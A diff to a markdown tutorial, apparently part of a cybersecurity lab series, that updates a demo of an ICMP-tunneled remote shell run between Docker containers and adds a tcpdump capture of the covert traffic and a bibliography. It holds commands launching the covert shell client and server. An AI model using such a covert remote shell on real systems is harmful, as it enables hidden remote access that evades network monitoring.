@@ -951,28 +951,63 @@ Let's try it out:
 
 ```bash
 # In the first terminal
-
 docker network create testnet
 docker run --privileged --net testnet -it basic_cybersecurity5:latest
-root@118df6d60e6b:~# ./icmp_shell c 127.0.0.1
-+ Raw to '127.0.0.1' (type : 0)
+root@d1c09e1b8f84:~# ./icmp_shell c 172.18.0.3
++ Raw to '172.18.0.3' (type : 0)
 
 # In the second terminal
 docker run --privileged --net testnet -it basic_cybersecurity5:latest
-root@118df6d60e6b:~# ./icmp_shell s 127.0.0.1
-+ Raw to '127.0.0.1' (type : 0)
+root@c134e2dbde63:~# ./icmp_shell s 172.18.0.2
++ Raw to '172.18.0.2' (type : 0)
+
+# In the third terminal
+docker exec -it d1c09e1b8f84 bash
+root@d1c09e1b8f84:~# tcpdump -nnXSs 0 -i eth0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+
 
 # In the first terminal
 # uname -a
-Linux 870535d4302a 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+iRS v0.1
+# ls
+checksec.sh
+client
+client.c
+crypt_shell
+crypt_shell.c
+icmp_shell
+icmp_shell.c
+rp++
+server
+server.c
+#
+
+# which produces the following output in the third terminal
+08:49:28.471170 IP 172.18.0.2 > 172.18.0.3: ICMP echo reply, id 12345, seq 5, length 15
+	0x0000:  4500 0023 e750 4000 4001 fb5f ac12 0002  E..#.P@.@.._....
+	0x0010:  ac12 0003 0000 594b 3039 0005 0003 0000  ......YK09......
+	0x0020:  6c73 0a                                  ls.
+08:49:28.476440 IP 172.18.0.3 > 172.18.0.2: ICMP echo reply, id 12345, seq 5, length 111
+	0x0000:  4500 0083 5462 4000 4001 8dee ac12 0003  E...Tb@.@.......
+	0x0010:  ac12 0002 0000 1614 3039 0005 0063 0000  ........09...c..
+	0x0020:  6368 6563 6b73 6563 2e73 680a 636c 6965  checksec.sh.clie
+	0x0030:  6e74 0a63 6c69 656e 742e 630a 6372 7970  nt.client.c.cryp
+	0x0040:  745f 7368 656c 6c0a 6372 7970 745f 7368  t_shell.crypt_sh
+	0x0050:  656c 6c2e 630a 6963 6d70 5f73 6865 6c6c  ell.c.icmp_shell
+	0x0060:  0a69 636d 705f 7368 656c 6c2e 630a 7270  .icmp_shell.c.rp
+	0x0070:  2b2b 0a73 6572 7665 720a 7365 7276 6572  ++.server.server
+	0x0080:  2e63 0a                                  .c.
+08:49:28.477890 IP 172.18.0.3 > 172.18.0.2: ICMP echo reply, id 12345, seq 5, length 14
+	0x0000:  4500 0022 5463 4000 4001 8e4e ac12 0003  E.."Tc@.@..N....
+	0x0010:  ac12 0002 0000 ac9f 3039 0005 0002 0000  ........09......
+	0x0020:  2320                                     #.
+
 ```
 
-Shell works perfectly however I'm unable to monitor the traffic with:
-```bash
-# In a third terminal
-docker run --privileged --net testnet -it basic_cybersecurity5:latest
-tcpdump -nnXSs 0 -i eth0 icmp
-
-```
-
-Nothing shows up.
+### Bibliography
+- [1] 0x00pf (2016), *Remote Shells. Part I*. Retrieved from https://0x00sec.org/t/remote-shells-part-i/269.
+- [2] picoFlamingo, *0x00sec_code*, Github. Retrieved from https://github.com/0x00pf/0x00sec_code/tree/master/remote_shell.
+- [3] 0x00pf (2016), *Remote Shells Part IV. The Invisible Remote Shell*. Retrieved from  https://0x00sec.org/t/remote-shells-part-iv-the-invisible-remote-shell/743
+- [4] 0x00pf (2016), *Remote Shells. Part II. Crypt your link*. Retrieved from https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.
